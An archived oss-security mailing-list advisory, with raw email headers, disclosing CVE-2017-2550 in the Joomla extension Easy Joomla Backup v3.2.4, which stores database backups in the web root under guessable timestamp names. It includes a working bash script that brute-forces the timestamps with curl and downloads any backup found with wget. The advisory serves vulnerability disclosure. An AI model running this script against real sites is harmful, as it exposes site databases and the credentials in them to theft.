X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2428" "Thursday" "28" "September" "2017" "08:35:38" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>" "58" "[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" nil nil nil "9" "2017092812:35:38" "[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" (number mark "U       larry0@me.co Sep 28   58/2428  " thread-indent "\"[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28638 invoked by uid 550); 28 Sep 2017 12:36:05 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28604 invoked from network); 28 Sep 2017 12:36:04 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1506602141; bh=W1NpPdNuZkDbZWLVtoeJCxcsIMfKEWruATW5dfMj7Ig=;
	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
	b=UN8tzl9nOGWfJbXYW1AfALhnkivs2Jj4YNptbXK71DqWwnoLxaNM+JIwTEV7y+Q9t
 qXqXElIBQ7yzuM2y3LVQ0PYwGt7aL/cdFIdC+cb5aN6lKW5F172iPqA+y8beP0KLFG
 irtRz6SVEdHJAIUGn9YCPJKvj9JM/xqr72/qSCA7AqJf+Ps1DTe3813T+m14nib56u
 0L+OTLahCHxmlCUWARMqmh8EcBVRgskys/UlPO+TMGSDo2UnVIQxBjsuBnjymxSWQp
 n3s7wk7Uyh/oF+9CDX+2r6Pm0bhNi7fK1gPoztF4VZ+cmk1OTLA8dJ9h3ps2zVoY1o
 R281OrvNCdg7w==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-09-28_04:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1707230000 definitions=main-1709280188
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Message-id: <E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>
Date: Thu, 28 Sep 2017 08:35:38 -0400
To: Open Source Security <oss-security@lists.openwall.com>
X-Mailer: Apple Mail (2.3273)
Subject: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure

Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
Author: Larry W. Cashdollar, @_larry0
Date: 2017-09-07
CVE-ID:[CVE-2017-2550]
Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-bac=
kup
Vendor: kubik-rubik
Vendor Notified: 2017-09-07
Vendor Contact:
Advisory: http://www.vapidlabs.com/advisory.php?v=3D200
Description: Easy Joomla Backup creates 'old-school' backups without any fr=
ills.
Vulnerability:
The software creates a copy of the backup in the web root.  The file name i=
s easily guessable as it's just a time stamp:

http://example.com/administrator/components/com_easyjoomlabackup/backups/DO=
MAIN_YEAR-MONTH-DAY_H-M-S.zip

Exploit Code:
	=E2=80=A2 #!/bin/bash
	=E2=80=A2 #Larry W. Cashdollar, @_larry0 9/7/2017
	=E2=80=A2 #Bruteforce download backups for Joomla Extension Easy Joomla Ba=
ckup v3.2.4
	=E2=80=A2 #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup
	=E2=80=A2 MONTH=3D09
	=E2=80=A2 DAY=3D07
	=E2=80=A2 YEAR=3D2017
	=E2=80=A2 Z=3D0
	=E2=80=A2 #May need to set the DOMAIN to $1 the target depending on how WP=
 is configured.
	=E2=80=A2 DOMAIN=3D192.168.0.163
	=E2=80=A2=20=20
	=E2=80=A2 echo "Scanning website for available backups:"
	=E2=80=A2 for y in `seq -w 0 23`; do
	=E2=80=A2         for x in `seq -w 0 59`; do
	=E2=80=A2                  Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;
	=E2=80=A2                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"
	=E2=80=A2         for z in `seq -w 0 59`; do
	=E2=80=A2                  Z=3D$(( $Z + 1 ));
	=E2=80=A2                  CPATH=3D"http://$1/administrator/components/com=
_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".=
zip";
	=E2=80=A2                  RESULT=3D`curl -s --head $CPATH|grep 200`;
	=E2=80=A2                 if [ -n "$RESULT" ]; then
	=E2=80=A2                  echo ""
	=E2=80=A2                  echo "[+] Location $CPATH Found";
	=E2=80=A2                  echo "[+] Received $RESULT";
	=E2=80=A2                  echo "Downloading......";
	=E2=80=A2                  wget $CPATH
	=E2=80=A2                 fi;
	=E2=80=A2         done
	=E2=80=A2         done
	=E2=80=A2 done
	=E2=80=A2 echo "Completed."=
